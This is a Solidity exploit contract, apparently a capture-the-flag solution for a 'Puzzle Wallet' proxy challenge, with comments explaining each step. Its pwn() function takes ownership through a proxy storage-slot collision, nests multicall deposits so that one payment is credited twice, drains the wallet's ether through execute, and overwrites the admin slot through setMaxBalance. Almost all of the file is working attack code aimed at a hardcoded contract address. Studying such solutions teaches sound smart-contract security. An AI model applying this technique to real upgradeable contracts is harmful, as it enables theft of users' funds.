pragma solidity ^0.8;

interface PuzzleProxy {
    function proposeNewAdmin(address) external;
    function approveNewAdmin(address) external;
    function upgradeTo(address) external;
}

interface PuzzleWallet {
    function init(uint256) external;
    function setMaxBalance(uint256) external;
    function addToWhitelist(address) external;
    function deposit() external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function multicall(bytes[] calldata) external payable;
}

contract expl {
        // due to proxy, the storage layout with clash with each other
    PuzzleWallet wallet = PuzzleWallet(0xC25279fd99233A3026AeAE6115f93129c39d6697);
    PuzzleProxy proxy = PuzzleProxy(0xC25279fd99233A3026AeAE6115f93129c39d6697);

    function pwn() public payable {
        bytes[] memory deposit_calldata = new bytes[](1);
        bytes[] memory multicall_nested = new bytes[](2);
        
            // pendingAdmin -> owner
        proxy.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

            // if we can call deposit multiple times in the same transac
            // balance dictionary would increase but our fund will be the same
            // but to do that we need to use multicall -> 
            // again multicall has a check for deposit function
            // hence we can nested call it as the variable is local

        
        deposit_calldata[0] = abi.encodeWithSelector(
             wallet.deposit.selector
        );

        multicall_nested[0] = abi.encodeWithSelector(
            wallet.multicall.selector, deposit_calldata
        );

        multicall_nested[1] = abi.encodeWithSelector(
            wallet.multicall.selector, deposit_calldata
        );

        wallet.multicall{value: 0.001 ether}(multicall_nested);

            // here balance[this] = 0.002, while we sent only 0.001
            // now since our balance = contract's balance
            // we can drain it it using execute sending ourselves the fund


        wallet.execute(msg.sender, 0.002 ether, "");

        // storage layout same, hence pwned
        wallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
